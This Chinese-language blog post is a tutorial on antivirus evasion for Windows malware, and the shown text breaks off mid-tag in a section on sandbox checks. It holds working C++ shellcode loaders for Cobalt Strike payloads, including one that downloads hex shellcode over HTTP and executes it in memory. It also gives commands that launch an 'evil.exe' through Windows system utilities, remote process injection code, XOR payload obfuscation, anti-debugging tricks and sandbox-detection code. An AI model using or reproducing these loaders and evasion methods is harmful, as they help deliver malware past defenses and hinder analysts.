    <content type="html"><![CDATA[<p>前面的话:”免杀一般都是靠组合拳”</p><h1 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h1><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>没什么好说的。可以自写加壳器等等</p><h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>不同的杀软对数字签名的敏感性不同，有些杀软可能只检查一下有没有数字签名就过了，有些杀软可能要去验证一下数字签名的正确性，有些可能管都不管数字签名。只能说添加数字签名能稍微提升一下exe的免杀几率。</p><h3 id="间接运行exe"><a href="#间接运行exe" class="headerlink" title="间接运行exe"></a>间接运行exe</h3><p>平时我们运行一个exe： cmd /c c:\a.exe  但这样容易被杀或者命令被ban。所有就有一些间接运行exe的方法</p><h4 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h4><p>forfiles是一个用于批处理的一个工具，它在找到文件后会执行指定的命令. </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;p 指定搜索文件的目录 &#x2F;m 指定搜索关键词 &#x2F;c 指定要执行的命令</span><br><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c c:\tmp\evil.exe  &#x2F;&#x2F;evil.exe会成为forfiles.exe的子进程</span><br></pre></td></tr></table></figure><h4 id="pcalua"><a href="#pcalua" class="headerlink" title="pcalua"></a>pcalua</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcalua -a c:\tmp\evil.exe  &#x2F;&#x2F;evil.exe不会成为子进程</span><br></pre></td></tr></table></figure><h4 id="cmd-Hijack"><a href="#cmd-Hijack" class="headerlink" title="cmd Hijack"></a>cmd Hijack</h4><p>下面命令将弹计算器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">cmd.exe &#x2F;c &quot;ping ;a.exe; 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">ping ;a.exe 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe</span><br></pre></td></tr></table></figure><h4 id="conhost"><a href="#conhost" class="headerlink" title="conhost"></a>conhost</h4><p>大于win7可用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conhost c:\windows\system32\calc.exe</span><br><span class="line">conhost adsadas&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe</span><br><span class="line"></span><br><span class="line">以下指令win10某些版本无法使用</span><br><span class="line">conhost &quot;asddas c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><h4 id="explorer-exe"><a href="#explorer-exe" class="headerlink" title="explorer.exe"></a>explorer.exe</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explorer.exe c:\windows\system32\calc.exe</span><br><span class="line">explorer asdsadasd,&quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h3 id="shellcode处理"><a href="#shellcode处理" class="headerlink" title="shellcode处理"></a>shellcode处理</h3><h4 id="指针执行-申请内存动态加载shellcode"><a href="#指针执行-申请内存动态加载shellcode" class="headerlink" title="指针执行+申请内存动态加载shellcode"></a>指针执行+申请内存动态加载shellcode</h4><p>首先从cobalt strike上生成拿到shellcode用作本次测试。<br>然后通过下面的代码，直接执行写死在程序里的shellcode。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buf, sizeof buf);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145713.png" alt="QQ截图20210217145713"></p><p>可以看见，还是很拉跨的。</p><h4 id="内联汇编加载shellcode"><a href="#内联汇编加载shellcode" class="headerlink" title="内联汇编加载shellcode"></a>内联汇编加载shellcode</h4><p>c++有强大的内联汇编功能，上次写壳的时候就感受了一番。<br>我们可以通过内联汇编代码加载shellcode.顺便加花什么的，都可以弄。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">_asm &#123;</span><br><span class="line">lea eax, buf;</span><br><span class="line">jmp eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145723.png" alt="QQ截图20210217145723"></p><p>还是蛮拉跨的，虽然我没有加花。</p><h4 id="HTTP协议远程读取shellcode"><a href="#HTTP协议远程读取shellcode" class="headerlink" title="HTTP协议远程读取shellcode"></a>HTTP协议远程读取shellcode</h4><p>这次我们不把shellcode写死在程序之中，而是通过程序发起http请求向外界获得shellcode并执行。<br>这里涉及到winhttp.h的一些函数的使用。</p><p>源码借用一下 卿 的代码。它的代码是直接把shellcode的十六进制以字符串形式直接放到远程服务器上。像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145737.png" alt="QQ截图20210217145737"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwSize &#x3D; 0;</span><br><span class="line">    DWORD dwDownloaded &#x3D; 0;</span><br><span class="line">    LPSTR pszOutBuffer &#x3D; NULL;</span><br><span class="line">    HINTERNET  hSession &#x3D; NULL,</span><br><span class="line">        hConnect &#x3D; NULL,</span><br><span class="line">        hRequest &#x3D; NULL;</span><br><span class="line">    BOOL  bResults &#x3D; FALSE;</span><br><span class="line">    hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">    if (hSession)</span><br><span class="line">    &#123;</span><br><span class="line">        hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;;</span><br><span class="line">    SIZE_T len &#x3D; lstrlenW(header);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line">    if (hRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;;</span><br><span class="line">        const void *ss &#x3D; (const char *)data.c_str();</span><br><span class="line">        bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);</span><br><span class="line">        &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Check for available data.</span><br><span class="line">            dwSize &#x3D; 0;</span><br><span class="line">            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!dwSize)</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer &#x3D; new char[dwSize + 1];</span><br><span class="line"></span><br><span class="line">            if (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Out of memory\n&quot;);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ZeroMemory(pszOutBuffer, dwSize + 1);</span><br><span class="line"></span><br><span class="line">            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;ok&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;char ShellCode[1024];</span><br><span class="line">            int code_length &#x3D; strlen(pszOutBuffer);</span><br><span class="line">            char* ShellCode &#x3D; (char*)calloc(code_length  &#x2F;2 , sizeof(unsigned char));</span><br><span class="line"></span><br><span class="line">            for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123;</span><br><span class="line">                sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]);</span><br><span class="line">                pszOutBuffer +&#x3D; 2;</span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%s&quot;, ShellCode);</span><br><span class="line">            &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer);</span><br><span class="line">            void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            memcpy(exec, ShellCode, sizeof ShellCode);</span><br><span class="line">            ((void(*)())exec)();</span><br><span class="line">            delete[] pszOutBuffer;</span><br><span class="line">            if (!dwDownloaded)</span><br><span class="line">                break;</span><br><span class="line">        &#125; while (dwSize &gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line">    if (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    if (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    if (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致流程便是:</p><p>1.通过winhttp中的函数，以HTTP的方法获取远程服务器上的shellcode（此时shellcode在内存中是按照编码结果存储的，如下图，左边是内存原文，右边是内存解码（shellcode））</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145818.png" alt="QQ截图20210217145818"></p><p>2.开辟一段内存，然后通过sscanf等方法读取存储shellcode变量的内容，将内存解码信息录入新的内存空间,使shellcode存在于内存中<br>3.执行shellcode，可以用指针执行等方法执行。</p><h4 id="使用加载器加载shellcode"><a href="#使用加载器加载shellcode" class="headerlink" title="使用加载器加载shellcode"></a>使用加载器加载shellcode</h4><h5 id="shellcode-launcher-加载器"><a href="#shellcode-launcher-加载器" class="headerlink" title="shellcode_ launcher 加载器"></a>shellcode_ launcher 加载器</h5><p><a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p><p>用msf或者cs生成raw形式shellcode，然后使用这个加载器加载一下就行了.<br>像这样 shellcode_launcher.exe -i C:\payload32.bin<br>shellcode_ launcher 在virustotal上报毒率也是很高很高了…</p><h5 id="SSI-加载器"><a href="#SSI-加载器" class="headerlink" title="SSI 加载器"></a>SSI 加载器</h5><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p><p> cs生成c形式shellcode，然后去除\x，再拿给ssi加载器加载,像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145832.png" alt="QQ截图20210217145832"></p><p>ssi.exe shellcode 即可完成加载</p><p>ssi在virustotal上报毒率也是非常高..</p><h5 id="自写加载器"><a href="#自写加载器" class="headerlink" title="自写加载器"></a>自写加载器</h5><p>ssi源码很简单大家可以参考写一下</p><h4 id="shellcode变形"><a href="#shellcode变形" class="headerlink" title="shellcode变形"></a>shellcode变形</h4><p>大思路就是把shellcode混淆后，放入加载器加载运行。<br>其细分思路就包括怎么把shellcode进行混淆了，简单的有XOR,BASE64，复杂一点的有AES等。<br>这里就只说说xor。<br>首先我们得准备一个程序将shellcode进行混淆。图方便就拿python写也是蛮不错的。<br>随便写了一个。效果真不戳（虽然上传了vt过两天就肯定不能用了)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145855.png" alt="QQ截图20210217145855"></p><p>github:<a href="https://github.com/ConsT27/SimpleXORshellcode">https://github.com/ConsT27/SimpleXORshellcode</a></p><h4 id="shellcode注入进程内存"><a href="#shellcode注入进程内存" class="headerlink" title="shellcode注入进程内存"></a>shellcode注入进程内存</h4><h5 id="注入已有进程"><a href="#注入已有进程" class="headerlink" title="注入已有进程"></a>注入已有进程</h5><p>大致逻辑:OpenProcess获得进程句柄-&gt;VirtualAllocEx在进程中开辟一段内存空间-&gt;WriteProcessMemory向刚刚开辟的内存空间中写入shellcode-&gt;CreateRemoteThread为刚刚写入的shellcode创建一个线程执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">DWORD pid &#x3D; 25388;</span><br><span class="line">HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">if (!Proc) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">if (buffer) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果:虽然也很拉，但是静态过了趋势是我没想到的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145906.png" alt="QQ截图20210217145906"></p><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>可以通过反调试来规避杀软检测，拖慢逆向工程师分析速度，但也有可能提高被判为恶意文件的概率。</p><h5 id="直接判断是否为调试状态"><a href="#直接判断是否为调试状态" class="headerlink" title="直接判断是否为调试状态"></a>直接判断是否为调试状态</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (IsDebuggerPresent()) return FALSE;</span><br><span class="line"></span><br><span class="line">PPEB pPEB &#x3D; (PPEB)__readgsqword(0x60);</span><br><span class="line">if (pPEB-&gt;BeingDebugged) return;</span><br><span class="line"></span><br><span class="line">BOOL ret;  </span><br><span class="line">CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  </span><br><span class="line">return ret;  </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NtQueryInformationProcess</span><br><span class="line"></span><br><span class="line">这个函数用来获取某进程的信息。</span><br><span class="line">需要动态链接库 #pragma comment(lib,&quot;ntdll&quot;)</span><br><span class="line">当然也可以用GetProcAddress动态获取这个函数。</span><br><span class="line">这个函数第一个参数指定进程句柄，第二个参数指定进程的特定结构，第三个参数获取返回值，第四个参数是返回值缓冲区大小，第五个填NULL</span><br><span class="line">其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)</span><br><span class="line">ProcessDebugPort参数，若没在调试中，则该函数返回0，若在调试中则返回对应的调试端口</span><br><span class="line">其他参数也类似</span><br><span class="line"></span><br><span class="line">看雪上houjingyi师傅的演示代码</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    int debugPort &#x3D; 0;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL);  </span><br><span class="line">    return debugPort !&#x3D; 0;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    HANDLE hdebugObject &#x3D; NULL;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL);  </span><br><span class="line">    return hdebugObject !&#x3D; NULL;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    BOOL bdebugFlag &#x3D; TRUE;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL);  </span><br><span class="line">    return bdebugFlag !&#x3D; TRUE;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="检测软件断点"><a href="#检测软件断点" class="headerlink" title="检测软件断点"></a>检测软件断点</h5><p>当我们在调试器中对一行代码打上断点时，实质上是将这行代码改为了0xcc，即INT 3，中断异常，所以调试器运行到此处时会停止。<br>那么我们就可以通过检测代码中是否有0xcc来判断是否被打上了软件断点，从而起到反调试的作用。</p><p>要做到这一点，可以使用汇编代码中的 repne scasb 指令，其第一个参数是缓冲区的起始地址，第二个参数是缓冲区大小，第三个参数是匹配的字符串。它会在指定的缓冲区内寻找字符串，若没有找到则返回.</p><h5 id="时间检测"><a href="#时间检测" class="headerlink" title="时间检测"></a>时间检测</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int t1 &#x3D; GetTickCount64();</span><br><span class="line">Hack(); &#x2F;&#x2F;一个函数，诱导分析人员在调试的时候跟进进去耽误时间</span><br><span class="line">int t2 &#x3D; GetTickCount64();</span><br><span class="line">if (((t2 - t1) &#x2F; 1000) &gt; 5) &#123;</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;  &#x2F;&#x2F;t1,t2检测时间过大则会是调试</span><br><span class="line"></span><br><span class="line">wprintf_s(L&quot;Now hacking more...\n&quot;);</span><br><span class="line"></span><br><span class="line">也可以用内联汇编完成</span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    DWORD time1, time2;  </span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        rdtsc  </span><br><span class="line">        mov time1, eax</span><br><span class="line">        ........垃圾代码，耽误分析人员时间</span><br><span class="line">        rdtsc  </span><br><span class="line">        mov time2, eax  </span><br><span class="line">    &#125;  </span><br><span class="line">    if (time2 - time1 &lt; 0xff)  </span><br><span class="line">    &#123;  </span><br><span class="line">        return FALSE;  </span><br><span class="line">    &#125;  </span><br><span class="line">    else  </span><br><span class="line">    &#123;  </span><br><span class="line">        return TRUE;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="检测父进程"><a href="#检测父进程" class="headerlink" title="检测父进程"></a>检测父进程</h5><p>见沙箱绕过章节中的“检测父进程”</p><h5 id="SEH中断"><a href="#SEH中断" class="headerlink" title="SEH中断"></a>SEH中断</h5><p>不是很懂</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void AD_BreakPoint()  </span><br><span class="line">&#123;  </span><br><span class="line">    printf(&quot;SEH : BreakPoint\n&quot;);  </span><br><span class="line">   </span><br><span class="line">    __asm &#123;  </span><br><span class="line">        &#x2F;&#x2F; install SEH  </span><br><span class="line">        push handler  </span><br><span class="line">        push DWORD ptr fs:[0]  </span><br><span class="line">        mov DWORD ptr fs:[0], esp  </span><br><span class="line">           </span><br><span class="line">        &#x2F;&#x2F; generating exception  </span><br><span class="line">        int 3  </span><br><span class="line">   </span><br><span class="line">        &#x2F;&#x2F; 1) debugging  </span><br><span class="line">        &#x2F;&#x2F;    go to terminating code  </span><br><span class="line">        mov eax, 0xFFFFFFFF  </span><br><span class="line">        jmp eax                 &#x2F;&#x2F; process terminating!!!  </span><br><span class="line">   </span><br><span class="line">        &#x2F;&#x2F; 2) not debugging  </span><br><span class="line">        &#x2F;&#x2F;    go to normal code  </span><br><span class="line">handler:  </span><br><span class="line">        mov eax, dword ptr ss:[esp+0xc]  </span><br><span class="line">        mov ebx, normal_code  </span><br><span class="line">        mov dword ptr ds:[eax+0xb8], ebx  </span><br><span class="line">        xor eax, eax  </span><br><span class="line">        retn  </span><br><span class="line">   </span><br><span class="line">normal_code:  </span><br><span class="line">        &#x2F;&#x2F;   remove SEH  </span><br><span class="line">        pop dword ptr fs:[0]  </span><br><span class="line">        add esp, 4  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    printf(&quot;  &#x3D;&gt; Not debugging...\n\n&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">int _tmain(int argc, TCHAR* argv[])  </span><br><span class="line">&#123;  </span><br><span class="line">    AD_BreakPoint();  </span><br><span class="line">   </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="沙箱绕过（Sandbox-Evasion）"><a href="#沙箱绕过（Sandbox-Evasion）" class="headerlink" title="沙箱绕过（Sandbox Evasion）"></a>沙箱绕过（Sandbox Evasion）</h3><h4 id="System-Checks"><a href="#System-Checks" class="headerlink" title="System Checks"></a>System Checks</h4><p>检测当前环境是否是沙箱环境，如果是沙箱则不表现出恶意行为。</p><h5 id="检测函数是否被HOOK更改"><a href="#检测函数是否被HOOK更改" class="headerlink" title="检测函数是否被HOOK更改"></a>检测函数是否被HOOK更改</h5><p>有些沙箱会对一些函数进行HOOK更改，我们可以通过在原DLL中查找原函数与进程中的函数进行比对从而判断其是否被HOOK.<br>这里是别人的代码(RedTeaming)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; manually load the dll</span><br><span class="line">HANDLE dllFile &#x3D; CreateFileW(L&quot;C:\\Windows\\System32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line">DWORD dllFileSize &#x3D; GetFileSize(dllFile, NULL);</span><br><span class="line">HANDLE hDllFileMapping &#x3D; CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);</span><br><span class="line">HANDLE pDllFileMappingBase &#x3D; MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);</span><br><span class="line">CloseHandle(dllFile);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; analyze the dll</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader &#x3D; (PIMAGE_DOS_HEADER)pDllFileMappingBase;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader &#x3D; (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptionalHeader &#x3D; (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportDirectory &#x3D; (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PULONG pAddressOfFunctions &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">PULONG pAddressOfNames &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">PUSHORT pAddressOfNameOrdinals &#x3D; (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; find the original function code</span><br><span class="line">PVOID pNtCreateThreadExOriginal &#x3D; NULL;</span><br><span class="line">for (int i &#x3D; 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)</span><br><span class="line">&#123;</span><br><span class="line">PCSTR pFunctionName &#x3D; (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);</span><br><span class="line">if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;))</span><br><span class="line">&#123;</span><br><span class="line">pNtCreateThreadExOriginal &#x3D; (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; compare functions</span><br><span class="line">PVOID pNtCreateThreadEx &#x3D; GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);</span><br><span class="line">if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;</span><br></pre></td></tr></table></figure><h5 id="GetTickCount"><a href="#GetTickCount" class="headerlink" title="GetTickCount"></a>GetTickCount</h5><p>GetTickCount 是win32 API之一，用来记录电脑开机后的运行时间（以毫秒为单位）<br>我们可以通过这个函数检测当前环境的运行时间，如果时间很短那么就有可能是沙箱。</p><p>为什么时间很短就可能是沙箱环境呢？沙箱对恶意程序的检测流程大致如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.启动虚拟环境</span><br><span class="line">2.将恶意程序复制进虚拟环境</span><br><span class="line">3.运行恶意程序一段时间（一般为5分钟）</span><br><span class="line">4.获取虚拟环境返回的报告</span><br><span class="line">5.关机</span><br></pre></td></tr></table></figure><p>全程不过6.7分钟，而正常的机器运行时间肯定是大于这个值的。那么我们就可以定一个标准：如果GetTickCount返回的值小于10min，那么就被判为沙箱环境。</p><h5 id="CPU-RAM等信息"><a href="#CPU-RAM等信息" class="headerlink" 